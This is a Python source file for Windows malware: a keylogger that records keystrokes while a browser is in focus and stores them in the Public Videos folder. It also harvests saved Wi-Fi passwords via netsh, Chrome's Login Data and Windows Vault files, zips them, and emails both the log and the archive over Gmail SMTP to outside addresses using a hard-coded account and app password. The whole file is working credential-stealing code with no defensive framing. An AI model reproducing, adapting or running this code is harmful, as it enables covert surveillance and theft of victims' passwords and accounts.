import pynput,os
import ctypes
import subprocess
from ctypes import wintypes
from pynput.keyboard import Key,Listener
file='C:\\Users\\Public\\Videos\\key.txt'
def pwd():
    import subprocess,smtplib,os
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    from email import encoders
    from shutil import copyfile,make_archive
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    cd={}
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        try:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
        except subprocess.CalledProcessError:
            continue
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            ae=i
            be=results[0]
        except IndexError:
            ae=i
            be=0
        if be:
            cd[str(ae)]=str(be)
    mail_content = ','.join(cd.keys())+'\n\n\n\n\n'+','.join(cd.values())
    sender_address = 'cvmuntest@gmail.com'
    sender_pass = 'ikihihaojprfbsyo'
    receiver_address = 'anirudhnfs01@gmail.com'
    message = MIMEMultipart()
    message['From'] = sender_address
    message['To'] = receiver_address
    message['Subject'] = 'wifi'
    message.attach(MIMEText(mail_content, 'plain'))
    user=os.environ['USERPROFILE']
    fo='C:\\Users\\Public\\Videos\\cred'
    if not os.path.isdir(fo):
        os.mkdir(fo)
    if os.path.isfile(user+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'):
        copyfile(user+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data',fo+'\\Login Data')
    if os.path.isdir(user+'\\AppData\\Local\\Microsoft\\Vault\\4BF4C442-9B8A-41A0-B380-DD4A704DDB28'):
        for a in os.listdir(user+'\\AppData\\Local\\Microsoft\\Vault\\4BF4C442-9B8A-41A0-B380-DD4A704DDB28'):
            try:
                copyfile(user+'\\AppData\\Local\\Microsoft\\Vault\\4BF4C442-9B8A-41A0-B380-DD4A704DDB28\\'+a,fo+'\\'+a)
            except:
                continue
    make_archive(fo, 'zip',fo)
    attachment = open('C:\\Users\\Public\\Videos\\cred.zip',"rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', 'attachment;filename=cred.zip')
    message.attach(p)
    session = smtplib.SMTP('smtp.gmail.com', 587)
    session.starttls()
    session.login(sender_address, sender_pass)
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()
    attachment.close()
    os.remove('C:\\Users\\Public\\Videos\\cred.zip')
def w(f):
    import smtplib
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    mail_content = f
    sender_address = 'cvmuntest@gmail.com'
    sender_pass = 'ikihihaojprfbsyo'
    receiver_address = 'rajasircollection@gmail.com'
    message = MIMEMultipart()
    message['From'] = sender_address
    message['To'] = receiver_address
    message['Subject'] = 'key'
    message.attach(MIMEText(mail_content, 'plain'))
    session = smtplib.SMTP('smtp.gmail.com', 587)
    session.starttls()
    session.login(sender_address, sender_pass)
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()
if os.path.isfile(file):
    filez=open(file,'r')
    w(filez.read())
    pwd()
    filez.close()
keys=open(file,'w+')
c=0
def on_press(k):
    global keys
    global c
    inter=str(k).strip("'")
    if inter=='Key.space':
        keys.write(' ')
    elif inter == 'Key.enter':
        keys.write('\n')
    elif inter not in ('Key.shift_r','Key.shift_l','Key.shift','Key.ctrl_l','Key.ctrl_r','Key.ctrl','Key.caps_lock') and c!=1:
        keys.write(inter)
    elif inter == 'Key.caps_lock':
        if c==1:
            c=0
        else:
            c=1
    if c==1 and inter!='Key.caps_lock':
        keys.write(inter.upper())
    keys.flush()
user32 = ctypes.windll.user32
while 1:
    h_wnd = user32.GetForegroundWindow()
    pid = wintypes.DWORD()
    user32.GetWindowThreadProcessId(h_wnd, ctypes.byref(pid))
    da=subprocess.check_output('tasklist /fi "pid eq '+str(pid.value)+'"').decode("utf-8").split('\n')
    de=da[-2].split()[0]
    dw=subprocess.check_output('tasklist').decode("utf-8")
    if de in ("msedge.exe","chrome.exe","firefox.exe"):
        with Listener(on_press=on_press) as listen:
            listen.join()
    else:
        continue
